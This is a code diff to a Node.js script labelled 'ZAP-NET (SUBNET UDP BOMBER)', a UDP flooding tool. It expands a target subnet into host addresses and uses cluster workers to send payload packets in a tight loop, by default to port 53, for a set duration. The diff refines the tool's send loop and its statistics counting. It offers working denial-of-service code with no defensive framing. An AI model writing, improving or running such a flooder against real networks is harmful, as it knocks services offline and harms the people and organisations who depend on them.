@@ -1,7 +1,6 @@
 const dgram = require('dgram');
 const cluster = require('cluster');
 const os = require('os');
-const { networkInterfaces } = require('os');
 
 const [subnet, portArg, durationArg] = process.argv.slice(2);
 const port = parseInt(portArg) || 53;
@@ -13,7 +12,7 @@ if (!subnet || !duration) {
   process.exit(1);
 }
 
-// --- Subnet parsing ---
+// --- CIDR to IP list ---
 function cidrToIps(cidr) {
   const [ip, bits] = cidr.split('/');
   const maskBits = parseInt(bits);
@@ -22,7 +21,7 @@ function cidrToIps(cidr) {
   const ipAsInt = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
   const hosts = 2 ** (32 - maskBits);
   const start = ipAsInt & (~(hosts - 1));
-  const end = start + hosts - 2; // skip broadcast
+  const end = start + hosts - 2; // exclude broadcast
 
   const ipList = [];
   for (let i = start + 1; i <= end; i++) {
@@ -51,7 +50,6 @@ function formatBytes(bytes) {
   return `${bytes.toFixed(2)} ${units[i]}`;
 }
 
-// --- Master Process ---
 if (cluster.isMaster) {
   console.clear();
   console.log(`ZAP-NET (SUBNET UDP BOMBER)`);
@@ -103,7 +101,6 @@ if (cluster.isMaster) {
     process.exit(0);
   }, duration * 1000);
 
-// --- Worker Threads ---
 } else {
   const socket = dgram.createSocket('udp4');
   let sent = 0;
@@ -113,12 +110,18 @@ if (cluster.isMaster) {
   function sendLoop() {
     if (Date.now() > endTime) return;
 
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 500; i++) {
       const target = targets[Math.floor(Math.random() * targets.length)];
-      socket.send(payload, port, target);
-      sent++;
-      bytesSent += payload.length;
-      bps += payload.length;
+
+      // Count only if send was successful (no error in callback)
+      socket.send(payload, port, target, (err) => {
+        if (!err) {
+          sent++;
+          bytesSent += payload.length;
+          bps += payload.length;
+        }
+        // else ignore failed sends for stats accuracy
+      });
     }
 
     setImmediate(sendLoop);
